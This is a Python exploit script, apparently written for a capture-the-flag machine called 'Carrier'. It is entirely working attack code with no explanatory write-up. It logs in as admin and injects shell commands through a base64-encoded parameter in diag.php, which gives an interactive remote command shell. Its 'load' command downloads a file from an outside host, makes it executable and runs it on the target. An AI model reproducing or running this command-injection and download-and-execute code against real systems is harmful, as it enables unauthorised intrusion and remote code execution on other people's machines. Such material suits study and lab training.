import requests, base64, argparse

parser = argparse.ArgumentParser(description='Program to get an RCE shell interface on the Carrier box. Made by 0xMurphy')
parser.add_argument('-c','--cookie', help='PHPSESSID')
parser.add_argument('rhost', help='Remote host IP')
args = parser.parse_args()

USERNAME='admin'
PASSWORD=''		# Removed since box is still live. Put login password here.

def payload(t):
	return base64.b64encode(('; '+t).encode()).decode()

def authenticate():
	r = requests.post('http://'+args.rhost+'/', data={'username':USERNAME,'password':PASSWORD},cookies={'PHPSESSID':args.cookie})
	if 'Dashboard' in r.text:
		print('Logged in as admin...')
	else:
		print('Login failed. Retrying...')
		authenticate()

def consolify(html):
	html = html[1396:]
	html = html[:html.find('</div>')]
	html = html.replace('<p>','')
	html = html.replace('</p>','\n')
	return html

def exploit():
	if not args.cookie:
		args.cookie='authBy0xMurphy'
	while True:
		i = input('RCE@'+args.rhost+'> ')
		if i=='exit':
			break
		if i.split()[0] == 'load':
			try:
				requests.post('http://'+args.rhost+'/diag.php',data={'check':payload('wget '+i.split()[1]+'/'+i.split()[2])},cookies={'PHPSESSID':args.cookie},headers={'referer':'http://'+args.rhost+'/diag.php'})
				requests.post('http://'+args.rhost+'/diag.php',data={'check':payload('chmod +x '+i.split()[2])},cookies={'PHPSESSID':args.cookie},headers={'referer':'http://'+args.rhost+'/diag.php'})
				requests.post('http://'+args.rhost+'/diag.php',data={'check':payload('./'+i.split()[2])},cookies={'PHPSESSID':args.cookie},headers={'referer':'http://'+args.rhost+'/diag.php'})
				r = requests.post('http://'+args.rhost+'/diag.php',data={'check':payload('ls -la')},cookies={'PHPSESSID':args.cookie},headers={'referer':'http://'+args.rhost+'/diag.php'})
			except:
				r = requests.post('http://'+args.rhost+'/diag.php',data={'check':payload('echo Incorrect use: load [host:port] [file]')},cookies={'PHPSESSID':args.cookie},headers={'referer':'http://'+args.rhost+'/diag.php'})
		elif i.split()[0] == 'help':
			print("""Created by 0xMurphy
===========================
load [host:port] [file] --  downloads and executes a file from a host
help 			-- displays this message
exit 			-- quits the shell
===========================
System Information
===========================""")
			r = requests.post('http://'+args.rhost+'/diag.php',data={'check':payload('pwd; whoami; id; ls -la')},cookies={'PHPSESSID':args.cookie},headers={'referer':'http://'+args.rhost+'/diag.php'})
		else:
			r = requests.post('http://'+args.rhost+'/diag.php',data={'check':payload(i)},cookies={'PHPSESSID':args.cookie},headers={'referer':'http://'+args.rhost+'/diag.php'})
		if '<title>Login</title>' in r.text:
			print('Authentication failed. Reauthenticating...')
			authenticate()
		else:
			print(consolify(r.text))

if __name__ == '__main__':
	exploit()
